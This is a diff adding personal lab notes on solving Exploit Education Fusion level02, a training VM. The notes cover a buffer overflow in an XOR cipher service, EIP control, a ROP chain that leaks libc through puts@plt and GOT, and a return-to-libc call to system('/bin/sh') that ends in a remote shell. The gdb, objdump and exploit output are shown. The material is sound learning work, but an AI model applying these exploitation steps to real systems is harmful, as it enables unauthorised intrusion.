@@ -1,0 +1,254 @@
+#######################
+General
+#######################
+Itinerary:
+* Find out how to use the application normally
+* Locate and confirm vulnerability
+* Build local version for easy exploitation testing
+* port over exploit to remote version
+
+Or maybe just try it immediately in remote?
+
+#######################
+Use the application
+#######################
+This is a really crappy application, I couldn't even get it to work properly with netcat (probably because the newline is also a byte)
+Created a normal_use function in fuzz.py.
+
+
+#######################
+Code analysis
+#######################
+Vulnerability: We can specify how much data to read in, and that amount can be larger than the size of the buffer (32 * 4096 = 131072).
+However, our payload gets ciphered with an XOR.
+The encryption key is static for concurrent encryptions, though. So we can encrypt once and work out what the cipher key is, and then pass a ciphered payload the next time, which will get unciphered to the correct payload.
+
+This time the stack isn't executable, though. So we can't return to the stack. We need a ROP chain that ends up giving us a reverse shell somehow.
+
+#######################
+Local build
+#######################
+We're missing some functions and I'm not sure where to get them. Might be more trouble than it's worth to get it working
+
+#######################
+Getting a Segfault
+#######################
+For some reason, when we send a payload that is too large, we only get ~3900 (and sometimes ~4100) bytes back. Always the same two numbers. And we're not getting a segfault. Weird...
+
+└─$ python3 fuzz.py                                                          1 ⨯
+[+] Opening connection to fusion on port 20002: Done
+[-- Enterprise configuration file encryption service --]
+
+Sent data size: 131092
+[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to s
+upport staff to retrieve your file --]
+
+Received size response: 131092
+Received data size is: 3972
+
+[*] Closed connection to fusion port 20002
+
+Edit: Found out why that happened. It's because recv() returns as soon as any data is available. I should have used recvn().
+
+Ripped off others' solutions and tried to build a segfault PoC from that. Got that working. But I still don't get why mine doesn't work properly, it seems like it should
+------------------------
+A new day
+------------------------
+Okay, got the segfault working! All I did was that I called the normal_use() function right after the cause_segfault() function.
+
+But we're not getting the segfault every time, and every time the segfaulted EIP is different (the stack pointer is the same, though). This is really strange...
+And when I remove the     io.send (b'Q') from the end of the cause_segfault, then it never segfaults
+
+Debugging with GDB - need to set follow_child
+
+
+OMFGGGGGGG I got it to work normally, finally. Apparently the issue was that I sent the data too fast? Adding time.sleep(1) in between the commands made it work reliably 100% of the time, and I didn't need to call normal_use() after cause_segfault() after that, either. Fuzz2.py is the new working version. Fuck...
+
+It's actually also not surprising that the segfaulting EIP is different, since my data is XOR'ed with a different key each time.
+
+#######################
+Controlling EIP
+#######################
+We need to be able to control what gets written into the buffer (control the result of the encryption/cipher). I see two solutions:
+1) We need to figure out the cipher key.
+2) We need to send the data we want, have it ciphered and resubmit it
+
+Option #2 seems easier, but if we submit the whole thing at once, then we'll be overriding the stack. I see two options:
+1) Maybe it works anyways?
+2) The keybuf is 32 bytes. Maybe it's possible to cipher 32 bytes at a time or something like that.
+
+Yay, Option 2.1 works! 
+root@fusion:/home/fusion# dmesg -c
+[86048.849897] level02[10027]: segfault at 42424242 ip 42424242 sp bfaf3140 error 14
+
+
+Ran a cyclic generator for 32 bytes: 
+aaaabaaacaaadaaaeaaafaaagaaahaaa
+Found this in dmesg: 61616165 which decodes to aaae.
+
+I'm assuming it's in little endian, so actually looking for eaaa. It takes 16 characters to get there, so let's try this:
+payload = b'A' * BUFFER_SIZE + b'B' * 16 + b'C' * 4
+
+Yep, I was right, EIP is now full of C's:
+[86621.898068] level02[10086]: segfault at 43434343 ip 43434343 sp bfaf3140 error 14
+
+
+#######################
+Leaking libc address
+#######################
+https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address
+
+------------------------
+John Hammond CSAW 19 video
+------------------------
+Apparently pwntools has stuff to deal with ELF files and we can use that convenintly with libc 
+
+libc = ELF('/path/to/libc.so') # YOU NEED TO USE THE CORRECT LIBC VERSION
+
+
+libc.address = printf_actual_address_with_ASLR - libc.symbols[b'printf'] # set the base address
+# libc.symbols[b'printf'] gets the address of printf in the libc shared object
+# In the b'printf', the bytes is important for python3 pwntools!
+
+NOTE: THIS WAS UPDATED, THE b' IS NO LONGER NECESSARY
+
+Get the location of a string:
+libc.search(b'/bin/sh').next()
+
+------------------------
+Useful sidenote
+------------------------
+If you don't know what the libc version is, then look at the side note here:
+https://blog.lamarranet.com/index.php/exploit-education-fusion-level-02-solution/
+
+
+Here's a better way, though: https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address#3.1-searching-for-libc-version-1
+
+------------------------
+Leaking the puts address
+------------------------
+Here's how we'll do it:
+1. Set EIP to PLT.GOT `puts` address and push the GOT `puts` address onto the stack (as an argument)
+2. PLT.GOT `puts` will execute the `puts` function
+3. The contents of GOT `puts` address will be printed out. Meaning, it will print out the address of the libc `puts` function.
+4. From that, we can calculate the libc base address, since the offset is always the same.
+
+NOTE: IF WE WERE DOING THIS IN x64, THEN WE WOULD NEED TO USE A ROP GADGET TO PUSH THE ARGUMENT INTO RDI INSTEAD OF ONTO THE STACK
+
+
+Getting the addresses:
+```
+root@fusion:/opt/fusion/bin# objdump -d level02 | grep puts --context 1
+08048930 <puts@plt>:
+ 8048930:	ff 25 b8 b3 04 08    	jmp    *0x804b3b8
+```
+puts@plt.got: 0x08048930
+puts@got: 		0x0804b3b8
+
+
+Using gdb, verified that we plt.got address becomes EIP
+Cheated and found out that the rop chain needs to be like this:
+```
+    rop_chain = [
+        puts_plt_got, 
+        0x41414141, # junk
+        puts_got
+    ]
+```
+
+I initially didn't expect that junk to be needed there. Let's investigate why the junk needs to be there...
+
+
+GDB even tells us that the string is correct when we put the junk in there:
+```
+(gdb) stepi
+_IO_puts (
+    str=0x804b3b8 "\260\243q\267F\211\004\bV\211\004\bf\211\004\b`\253w\267\206\211\004\b 0m\267\246\211\004\b\266\211\004\b\300\262w\267`\325x\267\340\252q\267\360Ap\267\006\212\004\b\026\212\004\b&\212\004\b\300Uu\267\360\062z\267 \327x\267\020\333x\267\260hu\267\300\261w\267") at ioputs.c:35
+35	ioputs.c: No such file or directory.
+	in ioputs.c
+(gdb) x/3x $esp
+0xbfaf3140:	0x41414141	0x0804b3b8	0x00004e22
+```
+
+
+By the time I had made it to the second page of the paginated disas, this was the result:
+(gdb) x/2x $esp
+0xbfaf3120:	0x0804b3b8	0x41414141
+
+Yeah the second param ends up in front for some reason
+Maybe that's the way libc works - it expects the 0x414141... to be a return address (because it needs to return somewhere, right). Yeah that makes sense I think.
+When we're calling puts@plt, then the return address is also placed onto the stack. libc expects that return address possibly.
+
+QUESTION: Why do we receive only that one address and not more?
+ANSWER: Maybe we do receive more, and we're only allowing 4 bytes through in our script? Need to check. --> Yes, that's right.
+
+The address I got was 0xb771a3b0. I also confirmed that the address doesn't change (at least not unless we kill the parent process)
+
+------------------------
+Calculating libc base address
+------------------------
+If I didn't have access to the machine and didn't know the libc version, then I could find out like this (side note): https://blog.lamarranet.com/index.php/exploit-education-fusion-level-02-solution/
+This works because ASLR doesn't completely randomize. The last 3 digits of the leaked address is enough to try to pinpoint the version used.
+
+It's extra work though and this challenge is hard enough for me, so let's just have the knowledge that this is libc-2.13.
+
+Going to use john hammond's method of calculating libc base address (detailed above)
+
+#######################
+Exploitation
+#######################
+We could just make a new connection and all the addresses would remain the same because the parent process was not killed and the ASLR addresses are the same when forking (I think. At least they definitely are the same right now when reconnecting)
+
+But that's boring. Let's reuse the same connection to make the solution more general. Let's just throw ourselves back into the start of the encrypt_file function and run the exploitation loop, now with the knowledge of the libc addresses.
+
+
+AND YES WE DID IIIIIIIT :D :D :D
+```
+└─$ python3 exploit.py
+[+] Opening connection to fusion on port 20002: Done
+b'[-- Enterprise configuration file encryption service --]\n'
+b'[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n'
+Sent data size: 131100
+Received size response: 131100
+Received data size is: 131100
+b'[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n'
+Sent data size: 131100
+Received size response: 131100
+Received data size is: 131100
+Yay, the service returned the initial payload. The memory should be set up with the payload now.
+Found address for libc puts: 0xb771a3b0
+[*] '/home/x90slide/exercises/exploit_education/fusion/level2/libc6_2.13-20ubuntu5_i386.so'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+libc base address is: 0xb76ba000
+libc system function address is: 0xb76f6b20
+libc exit function address is: 0xb76ec9e0
+libc /bin/sh string address is: 0xb77f28da
+b'[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n'
+Sent data size: 131100
+Received size response: 131100
+Received data size is: 131100
+b'[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n'
+Sent data size: 131100
+Received size response: 131100
+Received data size is: 131100
+Yay, the service returned the initial payload. The memory should be set up with the payload now.
+[*] Switching to interactive mode
+$ 
+$ 
+$ whoami
+whoami: cannot find name for user ID 20002
+$ id
+uid=20002 gid=20002 groups=20002
+$  
+```
+
+
+
+
+
+
+
